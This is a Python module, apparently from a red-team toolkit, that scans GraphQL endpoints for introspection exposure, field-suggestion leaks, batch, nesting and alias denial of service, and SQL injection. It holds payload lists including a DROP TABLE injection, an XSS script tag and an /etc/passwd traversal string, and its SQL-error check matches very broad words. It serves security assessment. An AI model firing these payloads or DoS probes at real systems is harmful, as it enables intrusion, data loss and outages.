#!/usr/bin/env python3
"""
GraphQL安全测试模块
功能: Schema内省检测、批量查询DoS、深层嵌套攻击、字段建议泄露、注入测试
作者: AutoRedTeam
"""

import json
import logging
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

import requests

logger = logging.getLogger(__name__)

# 统一 HTTP 客户端工厂
try:
    from core.http import get_sync_client
    HAS_HTTP_FACTORY = True
except ImportError:
    HAS_HTTP_FACTORY = False


class GraphQLVulnType(Enum):
    """GraphQL漏洞类型"""
    INTROSPECTION_ENABLED = "introspection_enabled"      # 内省开启
    BATCH_QUERY_DOS = "batch_query_dos"                  # 批量查询DoS
    DEEP_NESTING_DOS = "deep_nesting_dos"               # 深层嵌套DoS
    FIELD_SUGGESTION = "field_suggestion"               # 字段建议泄露
    ALIAS_OVERLOAD = "alias_overload"                   # 别名重载攻击
    DIRECTIVE_OVERLOAD = "directive_overload"           # 指令重载
    CIRCULAR_FRAGMENT = "circular_fragment"             # 循环片段
    SQLI_IN_ARGS = "sqli_in_arguments"                  # 参数SQL注入
    IDOR_IN_ARGS = "idor_in_arguments"                  # 参数IDOR


@dataclass
class GraphQLEndpoint:
    """GraphQL端点信息"""
    url: str
    introspection_enabled: bool = False
    schema: Dict[str, Any] = field(default_factory=dict)
    query_types: List[str] = field(default_factory=list)
    mutation_types: List[str] = field(default_factory=list)
    max_depth_allowed: int = 0
    batch_query_limit: int = 0


@dataclass
class GraphQLVulnerability:
    """GraphQL漏洞结果"""
    vuln_type: GraphQLVulnType
    severity: str
    description: str
    proof_of_concept: str
    remediation: str
    cvss_score: float = 0.0


class GraphQLSecurityTester:
    """GraphQL安全测试器"""

    # 内省查询Payloads
    INTROSPECTION_QUERIES = [
        # 基础内省
        '{"query":"{__schema{types{name}}}"}',
        # 完整Schema
        '{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name kind description fields{name args{name type{name}}type{name ofType{name}}}}}}"}',
        # 类型详情
        '{"query":"{__type(name:\\"Query\\"){fields{name args{name type{name kind ofType{name}}}}}}"}',
        # 指令查询
        '{"query":"{__schema{directives{name description locations args{name}}}}"}',
    ]

    # SQL注入Payloads
    SQLI_PAYLOADS = [
        ("'", "单引号"),
        ('"', "双引号"),
        ("' OR '1'='1", "OR注入"),
        ("1' AND '1'='1", "AND注入"),
        ("'; DROP TABLE users; --", "DROP注入"),
        ("1 UNION SELECT NULL--", "UNION注入"),
        ("1; WAITFOR DELAY '0:0:5'--", "时间盲注"),
    ]

    # 特殊字符测试
    SPECIAL_CHARS = [
        ("{{7*7}}", "模板注入"),
        ("${7*7}", "表达式注入"),
        ("<script>alert(1)</script>", "XSS"),
        ("../../../etc/passwd", "路径遍历"),
    ]

    def __init__(self, timeout: float = 10.0, proxy: Optional[str] = None):
        """
        初始化GraphQL测试器

        Args:
            timeout: 请求超时时间
            proxy: 代理地址
        """
        self.timeout = timeout
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        # 优先使用统一 HTTP 客户端工厂
        if HAS_HTTP_FACTORY:
            self._session = get_sync_client(proxy=proxy, force_new=True)
        else:
            self._session = requests.Session()
        self._session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json",
        })

    def _send_query(self, url: str, query: str,
                    variables: Optional[Dict] = None,
                    headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        发送GraphQL查询

        Returns:
            响应结果字典
        """
        payload = {"query": query}
        if variables:
            payload["variables"] = variables

        try:
            request_headers = headers.copy() if headers else {}
            request_headers.setdefault("Content-Type", "application/json")

            resp = self._session.post(
                url,
                json=payload,
                headers=request_headers,
                timeout=self.timeout,
                proxies=self.proxies
            )

            return {
                "success": True,
                "status_code": resp.status_code,
                "response_time": resp.elapsed.total_seconds(),
                "data": resp.json() if resp.text else {},
                "text": resp.text[:2000]
            }

        except json.JSONDecodeError:
            return {
                "success": True,
                "status_code": resp.status_code,
                "data": {},
                "text": resp.text[:2000],
                "parse_error": True
            }
        except requests.RequestException as e:
            return {
                "success": False,
                "error": str(e)
            }

    def _send_raw(self, url: str, body: str,
                  headers: Optional[Dict] = None) -> Dict[str, Any]:
        """发送原始请求体"""
        try:
            request_headers = headers.copy() if headers else {}
            request_headers.setdefault("Content-Type", "application/json")

            resp = self._session.post(
                url,
                data=body,
                headers=request_headers,
                timeout=self.timeout,
                proxies=self.proxies
            )

            return {
                "success": True,
                "status_code": resp.status_code,
                "response_time": resp.elapsed.total_seconds(),
                "data": resp.json() if resp.text else {},
                "text": resp.text[:2000]
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def test_introspection(self, url: str,
                           headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试内省查询是否开启

        Args:
            url: GraphQL端点URL
            headers: 额外的HTTP头
        """
        result = {
            "vulnerable": False,
            "vuln_type": "introspection_enabled",
            "severity": "medium",
            "description": "GraphQL内省功能开启,可能泄露完整API Schema",
            "schema_extracted": False,
            "types": [],
            "queries": [],
            "mutations": [],
            "remediation": "在生产环境禁用内省查询: schema.introspection = False"
        }

        for query_body in self.INTROSPECTION_QUERIES:
            response = self._send_raw(url, query_body, headers)

            if not response.get("success"):
                continue

            data = response.get("data", {})

            # 检查是否返回Schema数据
            if "data" in data and "__schema" in data.get("data", {}):
                result["vulnerable"] = True
                result["schema_extracted"] = True

                schema = data["data"]["__schema"]

                # 提取类型
                if "types" in schema:
                    result["types"] = [
                        t["name"] for t in schema["types"]
                        if not t["name"].startswith("__")
                    ]

                # 提取Query类型
                if "queryType" in schema and schema["queryType"]:
                    result["query_type"] = schema["queryType"].get("name", "")

                # 提取Mutation类型
                if "mutationType" in schema and schema["mutationType"]:
                    result["mutation_type"] = schema["mutationType"].get("name", "")

                result["proof"] = f"内省查询返回了{len(result['types'])}个类型定义"
                break

            # 检查__type查询
            elif "data" in data and "__type" in data.get("data", {}):
                result["vulnerable"] = True
                type_info = data["data"]["__type"]
                if type_info and "fields" in type_info:
                    result["queries"] = [f["name"] for f in type_info["fields"]]
                result["proof"] = f"__type查询返回了{len(result.get('queries', []))}个字段"
                break

        return result

    def test_batch_dos(self, url: str, max_queries: int = 100,
                       step: int = 10,
                       headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试批量查询DoS

        逐步增加批量查询数量,检测服务器限制
        """
        result = {
            "vulnerable": False,
            "vuln_type": "batch_query_dos",
            "severity": "medium",
            "description": "GraphQL允许批量查询可能导致DoS攻击",
            "max_queries_tested": 0,
            "max_queries_accepted": 0,
            "response_times": [],
            "remediation": "限制单次请求的查询数量,建议不超过10个"
        }

        base_query = '{"query":"{__typename}"}'

        for count in range(step, max_queries + 1, step):
            result["max_queries_tested"] = count

            # 构造批量查询
            batch = [json.loads(base_query) for _ in range(count)]
            batch_body = json.dumps(batch)

            start_time = time.time()
            response = self._send_raw(url, batch_body, headers)
            elapsed = time.time() - start_time

            result["response_times"].append({
                "count": count,
                "time": round(elapsed, 3)
            })

            if not response.get("success"):
                break

            data = response.get("data", {})

            # 检查是否为批量响应 (应该是数组)
            if isinstance(data, list) and len(data) == count:
                result["max_queries_accepted"] = count
                result["vulnerable"] = True
            elif response.get("status_code") == 400:
                # 被拒绝
                break

        if result["vulnerable"]:
            result["proof"] = f"服务器接受了{result['max_queries_accepted']}个批量查询"
            if result["max_queries_accepted"] >= 50:
                result["severity"] = "high"

        return result

    def test_deep_nesting(self, url: str, max_depth: int = 50,
                          field_name: str = "user",
                          headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试深层嵌套DoS

        Args:
            url: GraphQL端点
            max_depth: 最大测试深度
            field_name: 嵌套字段名
        """
        result = {
            "vulnerable": False,
            "vuln_type": "deep_nesting_dos",
            "severity": "medium",
            "description": "GraphQL允许深层嵌套查询可能导致DoS",
            "max_depth_tested": 0,
            "max_depth_accepted": 0,
            "response_times": [],
            "remediation": "限制查询嵌套深度,建议不超过10层"
        }

        for depth in range(5, max_depth + 1, 5):
            result["max_depth_tested"] = depth

            # 构造深层嵌套查询
            query = self._generate_nested_query(depth, field_name)
            payload = {"query": query}

            start_time = time.time()
            response = self._send_query(url, query, headers=headers)
            elapsed = time.time() - start_time

            result["response_times"].append({
                "depth": depth,
                "time": round(elapsed, 3)
            })

            if not response.get("success"):
                break

            # 检查是否被拒绝
            data = response.get("data", {})
            errors = data.get("errors", [])

            depth_error = any(
                "depth" in str(e).lower() or "nested" in str(e).lower()
                for e in errors
            )

            if depth_error or response.get("status_code") == 400:
                break
            else:
                result["max_depth_accepted"] = depth
                result["vulnerable"] = True

        if result["vulnerable"]:
            result["proof"] = f"服务器接受了{result['max_depth_accepted']}层嵌套查询"
            if result["max_depth_accepted"] >= 20:
                result["severity"] = "high"

        return result

    def _generate_nested_query(self, depth: int, field: str = "user") -> str:
        """生成深层嵌套查询"""
        inner = "__typename"
        for _ in range(depth):
            inner = f"{field}{{{inner}}}"
        return f"query{{{inner}}}"

    def test_field_suggestion(self, url: str,
                              headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试字段建议信息泄露

        发送错误的字段名,检查服务器是否返回建议
        """
        result = {
            "vulnerable": False,
            "vuln_type": "field_suggestion",
            "severity": "low",
            "description": "GraphQL返回字段建议可能帮助攻击者枚举Schema",
            "suggestions_found": [],
            "remediation": "禁用字段建议功能或限制错误信息详细程度"
        }

        # 测试常见错误字段名
        test_queries = [
            '{"query":"{usr{id}}"}',  # user的错误拼写
            '{"query":"{pasword}"}',   # password的错误拼写
            '{"query":"{admn}"}',      # admin的错误拼写
            '{"query":"{usrs{emal}}"}',  # users.email的错误拼写
        ]

        for query_body in test_queries:
            response = self._send_raw(url, query_body, headers)

            if not response.get("success"):
                continue

            data = response.get("data", {})
            errors = data.get("errors", [])

            for error in errors:
                message = str(error.get("message", ""))

                # 检查是否包含建议
                if "did you mean" in message.lower() or "suggest" in message.lower():
                    result["vulnerable"] = True

                    # 提取建议的字段名
                    suggestions = re.findall(r'"([^"]+)"', message)
                    result["suggestions_found"].extend(suggestions)

        if result["vulnerable"]:
            result["suggestions_found"] = list(set(result["suggestions_found"]))
            result["proof"] = f"发现{len(result['suggestions_found'])}个字段建议"

        return result

    def test_alias_overload(self, url: str, max_aliases: int = 100,
                            headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试别名重载攻击

        使用大量别名执行同一查询
        """
        result = {
            "vulnerable": False,
            "vuln_type": "alias_overload",
            "severity": "medium",
            "description": "GraphQL允许大量别名可能导致DoS",
            "max_aliases_accepted": 0,
            "remediation": "限制单次查询的别名数量"
        }

        for count in [10, 50, 100, 200]:
            if count > max_aliases:
                break

            # 构造别名查询
            aliases = " ".join([f"a{i}:__typename" for i in range(count)])
            query = f"query{{{aliases}}}"

            response = self._send_query(url, query, headers=headers)

            if not response.get("success"):
                break

            data = response.get("data", {})

            # 检查是否返回所有别名的结果
            if "data" in data and len(data["data"]) >= count:
                result["max_aliases_accepted"] = count
                result["vulnerable"] = True
            elif response.get("status_code") == 400:
                break

        if result["vulnerable"]:
            result["proof"] = f"服务器接受了{result['max_aliases_accepted']}个别名"

        return result

    def test_sqli_in_args(self, url: str, param_name: str = "id",
                          headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试GraphQL参数SQL注入
        """
        result = {
            "vulnerable": False,
            "vuln_type": "sqli_in_arguments",
            "severity": "critical",
            "description": "GraphQL参数可能存在SQL注入",
            "vulnerable_payloads": [],
            "remediation": "使用参数化查询,对所有输入进行验证"
        }

        for payload, desc in self.SQLI_PAYLOADS:
            # 构造带参数的查询
            query = f'query{{user({param_name}:"{payload}"){{id name}}}}'

            response = self._send_query(url, query, headers=headers)

            if not response.get("success"):
                continue

            text = response.get("text", "").lower()
            data = response.get("data", {})
            errors = data.get("errors", [])

            # 检查SQL错误特征
            sql_error_patterns = [
                "sql", "syntax", "mysql", "postgresql", "sqlite",
                "ora-", "mssql", "query", "column", "table"
            ]

            for pattern in sql_error_patterns:
                if pattern in text:
                    result["vulnerable"] = True
                    result["vulnerable_payloads"].append({
                        "payload": payload,
                        "type": desc,
                        "evidence": text[:200]
                    })
                    break

        if result["vulnerable"]:
            result["proof"] = f"发现{len(result['vulnerable_payloads'])}个SQL注入点"

        return result

    def full_scan(self, url: str,
                  headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        完整GraphQL安全扫描
        """
        result = {
            "url": url,
            "vulnerabilities": [],
            "tests": {},
            "summary": {
                "total_tests": 0,
                "vulnerable_count": 0,
                "highest_severity": "none"
            },
            "recommendations": []
        }

        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}
        highest_severity = "none"

        # 执行所有测试
        tests = [
            ("introspection", lambda: self.test_introspection(url, headers)),
            ("batch_dos", lambda: self.test_batch_dos(url, 50, 10, headers)),
            ("deep_nesting", lambda: self.test_deep_nesting(url, 30, "user", headers)),
            ("field_suggestion", lambda: self.test_field_suggestion(url, headers)),
            ("alias_overload", lambda: self.test_alias_overload(url, 100, headers)),
        ]

        for test_name, test_func in tests:
            try:
                test_result = test_func()
                result["tests"][test_name] = test_result
                result["summary"]["total_tests"] += 1

                if test_result.get("vulnerable"):
                    result["summary"]["vulnerable_count"] += 1
                    severity = test_result.get("severity", "low")

                    if severity_order.get(severity, 0) > severity_order.get(highest_severity, 0):
                        highest_severity = severity

                    result["vulnerabilities"].append({
                        "type": test_name,
                        "severity": severity,
                        "proof": test_result.get("proof", ""),
                        "remediation": test_result.get("remediation", "")
                    })

                    if test_result.get("remediation"):
                        result["recommendations"].append(test_result["remediation"])

            except Exception as e:
                logger.error(f"测试{test_name}失败: {e}")
                result["tests"][test_name] = {"error": str(e)}

        result["summary"]["highest_severity"] = highest_severity
        result["recommendations"] = list(set(result["recommendations"]))

        return result


# 便捷函数
def quick_graphql_scan(url: str) -> Dict[str, Any]:
    """快速GraphQL安全扫描"""
    tester = GraphQLSecurityTester()
    return tester.full_scan(url)


if __name__ == "__main__":
    # 测试示例
    test_url = "https://example.com/graphql"

    tester = GraphQLSecurityTester()

    # 测试内省
    result = tester.test_introspection(test_url)
    print(f"Introspection enabled: {result.get('vulnerable')}")
